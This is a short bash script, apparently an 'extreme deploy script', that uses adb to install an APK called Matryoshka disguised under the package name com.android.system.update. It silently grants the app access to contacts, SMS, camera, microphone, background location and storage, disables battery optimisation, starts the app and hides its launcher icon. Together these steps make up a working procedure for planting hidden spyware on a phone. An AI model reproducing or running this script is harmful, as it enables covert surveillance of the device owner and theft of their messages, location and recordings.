#!/bin/bash
# 🔴 EKSTREM DEPLOY SCRIPT

APK_FILE=$(ls Matryoshka_v6.0_*.apk | head -1)

if [ -z "$APK_FILE" ]; then
    echo "❌ APK not found. Run build.sh first"
    exit 1
fi

echo "📱 Deploying: $APK_FILE"

# Install to device
adb install -r -d "$APK_FILE"

# Grant all permissions
PACKAGE="com.android.system.update"
PERMISSIONS=(
    "android.permission.READ_CONTACTS"
    "android.permission.READ_SMS"
    "android.permission.RECEIVE_SMS"
    "android.permission.CAMERA"
    "android.permission.RECORD_AUDIO"
    "android.permission.ACCESS_FINE_LOCATION"
    "android.permission.ACCESS_BACKGROUND_LOCATION"
    "android.permission.READ_EXTERNAL_STORAGE"
    "android.permission.MANAGE_EXTERNAL_STORAGE"
    "android.permission.SYSTEM_ALERT_WINDOW"
    "android.permission.WRITE_SETTINGS"
)

for perm in "${PERMISSIONS[@]}"; do
    adb shell pm grant $PACKAGE $perm 2>/dev/null
done

# Disable battery optimization
adb shell dumpsys deviceidle disable

# Start app
adb shell am start -n $PACKAGE/.MainActivity

# Hide icon (optional)
adb shell pm disable --user 0 $PACKAGE/.MainActivity

echo "✅ DEPLOY COMPLETE - APK ACTIVE"